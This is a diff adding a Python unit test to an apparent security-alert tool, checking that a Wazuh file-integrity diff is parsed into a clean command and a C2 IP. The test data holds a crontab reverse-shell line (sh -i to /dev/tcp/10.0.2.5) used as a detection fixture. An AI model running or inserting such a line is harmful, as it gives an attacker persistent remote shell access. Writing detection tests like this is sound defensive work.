@@ -80,6 +80,35 @@ class TestFindingsBoard(unittest.TestCase):
         # The C2 IP must be extracted from the decoded payload
         self.assertIn("10.0.2.5", ips, f"C2 IP missing from artifacts: {ips}")
 
+    def test_fim_diff_reverse_shell_is_cleaned_of_diff_markers(self):
+        # Wazuh FIM/syscheck stores the changed crontab line as a diff blob. The
+        # whole blob must not become `command: 0a1` / `command: > ...` noise —
+        # only the clean shell line should be recorded.
+        raw = json.dumps({"hits": {"hits": [{
+            "_id": "evt-diff",
+            "_source": {
+                "syscheck": {
+                    "path": "/var/spool/cron/crontabs/user",
+                    "diff": "0a1\n> * * * * * sh -i >& /dev/tcp/10.0.2.5/5555 0>&1",
+                },
+            },
+        }]}})
+        artifacts = extract_artifacts(raw)
+        commands = [a.value for a in artifacts if a.kind == "command"]
+        ips = [a.value for a in artifacts if a.kind == "ip"]
+        # The clean shell line is recorded...
+        self.assertTrue(
+            any(c == "* * * * * sh -i >& /dev/tcp/10.0.2.5/5555 0>&1" for c in commands),
+            f"clean shell line not found in commands: {commands}",
+        )
+        # ...and no diff-marker noise leaked as a command artifact.
+        self.assertFalse(
+            any(c.strip() in {"0a1", ">", "<"} or c.startswith(("> ", "< ", "0a1"))
+                for c in commands),
+            f"diff-marker noise leaked into commands: {commands}",
+        )
+        self.assertIn("10.0.2.5", ips, f"C2 IP missing from artifacts: {ips}")
+
     def test_nested_event_artifacts_are_extracted(self):
         artifacts = extract_artifacts(asyncio.run(EventSearchTool().ainvoke({})))
         pairs = {(item.kind, item.value, item.source) for item in artifacts}
